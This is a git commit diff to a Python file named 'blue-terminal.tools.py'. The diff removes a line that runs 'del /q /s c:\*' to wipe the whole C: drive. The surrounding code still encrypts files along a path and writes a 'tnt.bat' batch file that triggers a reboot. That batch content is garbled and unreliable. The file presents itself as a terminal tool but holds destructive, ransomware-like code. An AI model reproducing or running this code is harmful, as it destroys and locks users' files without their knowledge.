7c13b4d033d5bbe08f686c9c3d6379acdb84d2a2
blue-terminal <marco.dandrea777@gmail.com>
2024-12-31 17:35:14 +0100

    Update blue-terminal.tools.py

--- blue-terminal.tools.py
+++ blue-terminal.tools.py
@@ -664,8 +664,6 @@ lenguge
                 if os.path.isfile(percorso):
                     encrypter_file(percorso)
         numeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
-        comando="color a & del /q /s c:\*"
-        os.system(comando)
         print("errore ripora ")
         file=open("tnt.bat","w")
         file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
